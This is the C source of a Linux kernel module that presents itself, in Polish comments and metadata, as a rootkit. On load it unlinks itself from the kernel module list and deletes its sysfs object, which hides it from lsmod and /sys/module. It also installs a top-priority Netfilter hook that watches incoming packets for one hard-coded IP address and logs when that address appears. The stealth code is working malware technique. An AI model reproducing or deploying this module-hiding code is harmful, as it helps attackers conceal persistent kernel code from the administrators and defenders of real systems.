#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/init.h>
#include <linux/list.h>
//
#include <linux/ip.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
//
#include "rootkit.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Dawid Paluchowski");
MODULE_DESCRIPTION("Rootkit - jesli mnie widzisz, cos poszlo nie tak");
// Zmienne
// statio zastosowane w celu unikniecia wpisu w /proc/kallsyms
static struct list_head* previousModule;
static int isHidden = 0;

// obiekt hooka Netfiltera
static struct nf_hook_ops nfin;

__u32 convertASCIItoBinary(const char *str) {
  unsigned long l;
  unsigned int val;
  int i;

  l = 0;
  for (i = 0; i < 4; i++) {
    l <<= 8;
    if(*str != '\0') {
      val = 0;
      while (*str != '\0' && *str != '.') {
        val *= 10;
        val += *str - '0';
        str++;
      }
      l |= val;
      if(*str != '\0') {
        str++;
      }
    }
  }
  return htonl(l);
}

// kod hooka
static unsigned int hook_func_in(unsigned int hooknum, struct sk_buff *skb,
                                  const struct net_device *in,
                                  const struct net_device *out,
                                  int (*okfn)(struct sk_buff *)) {
  struct ethhdr *eth;
  struct iphdr *ip_header;
  // if in to nie nasze urzadzenie -> NF_ACCEPT
  // else

  eth = (struct ethhdr*)skb_mac_header(skb);
  ip_header = (struct iphdr *)skb_network_header(skb);

  __u32 trapIP = convertASCIItoBinary("212.77.100.188");
  if(trapIP == ip_header->saddr) {
      printk(KERN_INFO "WP.PL NAJLEPSZA STRONA W SIECI");
      //printk(KERN_INFO "src mac %pM, dst mac %pM\n", eth->h_source, eth->h_dest);
      //printk(KERN_INFO "src iP addr:=%pI4", &ip_header->saddr);
  }
  //printk(KERN_INFO "src mac %pM, dst mac %pM\n", eth->h_source, eth->h_dest);
  //printk(KERN_INFO "src iP addr:=%pI4", &ip_header->saddr);
  return NF_ACCEPT;
}



// Chowanie aktywnego modulu w listingu lsmoddo tego modulu
// Wykorzystane funkcje:
//   lista dwukierunkowa Kernel-API:
//    list_del_init(list_head elementDoUsuniecia)
//    list_add(list_head nowyElement, list_head poprzednikNowego);
void hideModule(){
  if(isHidden != 1) {
    // Chowanie aktywnego modulu w listingu lsmod
    previousModule = THIS_MODULE -> list.prev;
    list_del_init(&THIS_MODULE -> list); // Usuniecie wezla z listy i jej reinicjalizacja
    // Chowanie modulu w folderze /sys/module
    kobject_del(&THIS_MODULE -> mkobj.kobj);
    isHidden = 1;
  }
}


static int __init rkit_init(void) {
  // Ukrycie modulu
  hideModule();
  printk(KERN_INFO "(Rootkit)Ten proces to \"%s\" (pid %i)\n", current->comm, current->pid);
  // Podlaczenie hooka Netfiltrera
  nfin.hook = hook_func_in;
  nfin.hooknum = 0;
  nfin.pf = PF_INET;
  nfin.priority = INT_MIN;
  nf_register_hook(&nfin);
  return 0;
}

static void __exit rkit_cleanup(void) {
  printk(KERN_INFO "Czyszczenie po module.\n");
  // odlaczenie hooka
  nf_unregister_hook(&nfin);
}

module_init(rkit_init);
module_exit(rkit_cleanup);
